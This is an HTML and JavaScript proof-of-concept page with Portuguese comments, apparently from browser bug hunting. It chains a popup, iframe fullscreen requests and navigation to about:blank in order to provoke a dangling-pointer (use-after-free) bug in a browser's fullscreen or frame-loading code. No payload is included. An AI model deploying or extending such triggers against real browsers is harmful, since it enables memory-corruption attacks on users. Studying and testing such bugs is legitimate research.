<html>
<body>
<button id="run">Run V2.3</button>
<div id="status">Ready</div>
<iframe id="testFrame" width="100" height="100"></iframe>
<script>
/*
  V2.3: Substitui iframe.remove() por iframe.src = 'about:blank'
  Teardown path diferente — a navegação destrói o Document do filho
  mas mantém o HTMLIFrameElement no DOM, o que pode deixar o
  FullscreenManager em estado diferente do remove() direto.
  Pode expor ponteiro pendente no FrameLoader em vez do FullscreenManager.
*/
var iframe = document.getElementById("testFrame");
var popup  = null;

iframe.onload = function() {
    var iDoc = iframe.contentDocument;

    // Evita re-trigger no onload do about:blank
    if (!iDoc || !iDoc.documentElement) return;
    if (iDoc.body && iDoc.body.children.length === 0) return;

    iDoc.open();
    iDoc.write(
        '<!DOCTYPE html><html><body>' +
        '<div style="width:200px;height:150px;background:blue"></div>' +
        '</body></html>'
    );
    iDoc.close();

    iDoc.addEventListener('webkitfullscreenchange', function() {
        document.getElementById("status").innerHTML = "child fullscreenchange";

        // Navega em vez de remover — Document destruído, iframe permanece
        iframe.src = "about:blank";
        if (popup && !popup.closed) popup.close();

        document.getElementById("status").innerHTML += " | navigated to about:blank";

        // Acessa estado do fullscreen no pai depois da navegação
        setTimeout(function() {
            var el = document.webkitFullscreenElement;
            document.getElementById("status").innerHTML +=
                " | parent fsEl=" + (el ? el.tagName : "null");
            if (el) {
                try {
                    document.getElementById("status").innerHTML +=
                        " clientW=" + el.clientWidth;
                } catch(e) {
                    document.getElementById("status").innerHTML += " EX:" + e;
                }
            }
        }, 100);
    });

    iDoc.documentElement.webkitRequestFullscreen();

    setTimeout(function() {
        if (!popup || popup.closed) return;
        popup.focus();
        window.focus();
        try { iframe.contentWindow.focus(); } catch(e) {}
        setTimeout(function() {
            if (popup && !popup.closed) popup.close();
        }, 300);
    }, 300);
};

document.getElementById("run").onclick = function() {
    document.getElementById("status").innerHTML = "iniciando...";
    popup = window.open("", "_blank", "width=400,height=300");
    if (!popup) { document.getElementById("status").innerHTML = "bloqueado"; return; }
    popup.document.open();
    popup.document.write('<!DOCTYPE html><html><body><h3>Popup</h3></body></html>');
    popup.document.close();
};
</script>
</body>
</html>
